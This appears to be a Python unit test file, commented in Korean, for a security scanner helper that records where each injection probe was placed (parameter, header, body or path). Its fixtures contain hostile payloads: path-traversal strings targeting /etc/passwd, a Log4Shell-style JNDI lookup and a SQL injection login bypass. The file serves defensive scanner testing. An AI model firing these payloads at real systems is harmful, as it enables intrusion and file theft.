"""확증 스캔 프로브가 '어디에 주입됐는지'(요청 정보)를 담는지 — _probe_req_info 단위 테스트.

배경: 확증 스캔 결과표에 프로브 값만 보이고 '실제로 어디로 갔는지'(위치·파라미터·최종 URL)가
없어 분석가가 주입 지점을 확인하기 어려웠다. 이제 프로브마다 location/param/req_url/injected 를 함께 낸다.
"""
from routers.api import _probe_req_info


def test_param_location_shows_final_url():
    r = _probe_req_info("param", "q", "GET", "http://t/s?q=../etc/passwd", "../etc/passwd")
    assert r["location"] == "param"
    assert r["param"] == "q"
    assert r["req_method"] == "GET"
    assert r["req_url"] == "http://t/s?q=../etc/passwd"
    assert r["injected"] == "http://t/s?q=../etc/passwd"   # param 은 URL 에 반영


def test_header_location_shows_name_and_value():
    r = _probe_req_info("header", "X-Api-Version", "GET", "http://t/p", "${jndi:ldap://x}")
    assert r["location"] == "header"
    assert r["injected"] == "X-Api-Version: ${jndi:ldap://x}"


def test_body_location_shows_field_and_value():
    r = _probe_req_info("body", "username", "POST", "http://t/login", "admin'-- -")
    assert r["location"] == "body"
    assert r["req_method"] == "POST"
    assert r["injected"] == "body username=admin'-- -"


def test_path_location_shows_final_url():
    r = _probe_req_info("path", "", "GET", "http://t/files/....//etc/passwd", "....//etc/passwd")
    assert r["location"] == "path"
    assert r["injected"] == "http://t/files/....//etc/passwd"


def test_defaults_when_param_missing():
    assert _probe_req_info("param", "", "get", "http://t/?q=x", "x")["param"] == "q"
    assert _probe_req_info("body", "", "GET", "http://t/", "x")["param"] == "q"
    assert _probe_req_info("header", "", "GET", "http://t/", "x")["injected"].startswith("X-Test-Payload:")
    assert _probe_req_info(None, None, None, "http://t/", "x")["req_method"] == "GET"
